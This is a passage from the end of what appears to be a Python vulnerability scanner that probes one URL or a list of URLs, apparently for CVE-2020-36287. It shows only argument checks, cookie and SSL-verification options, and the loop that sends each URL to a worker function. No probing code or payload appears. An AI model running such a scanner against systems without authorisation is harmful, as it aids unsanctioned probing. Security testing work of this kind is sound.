            print(f"\t{RED}The Output Path {output_folder} does not Exist")
            sys.exit(1)

        if args.url == None and args.input_file==None:
            print(f"{RED}\tNo URL Provided\n\tUse -u/--url to provide an URL")
            sys.exit(0)

        if args.url != None and args.input_file!=None:
            print(f"{RED}\tMultiple Inputs Provided\n\tUse Either -u(URL) or -f(FILE) as Input")
            sys.exit(0)

        if args.cookie:
            headers['Cookie'] = args.cookie

        if args.insecure:
            print(f"{RED}\tSSL errors will be turned off because the -i(insecure) flag is used.")
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            verify_ssl=False

        if args.input_file:
            print(f" {CYAN}Input File Provided : {args.input_file.name}{RESET}\n\n")
            input_file=args.input_file.name
            uselesscounter=True
            with open(input_file,'r') as urls_file:
                for url in urls_file.readlines():
                    if url.strip() not in unq_url:
                        unq_url.append(url.strip())
            with open(input_file,'r') as urls_file:
                for url in urls_file.readlines():
                    if uselesscounter:
                        print(f" {CYAN}{len(unq_url)} Unique Urls Found{RESET}")
                        uselesscounter=False
                    url=url.strip()
                    worker(url)

        else:
            url=args.url
            worker(url)

    except KeyboardInterrupt:
        print (f"{RED} Keyboard Interrupt Detected {RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}An Unexpected Error Occured:{RESET} {e}")





if __name__=="__main__":
    try:
        response_CVE_2020_36287=[]
        unq_url=[]
        response=[]
        global is_aws
        global url
        main()

    except KeyboardInterrupt:
        print (f"{RED} Keyboard Interrupt Detected {RESET}")
        sys.exit(0)

    except Exception as e:
        print(f"{RED}An Unexpected Error Occured:{RESET} {e}")
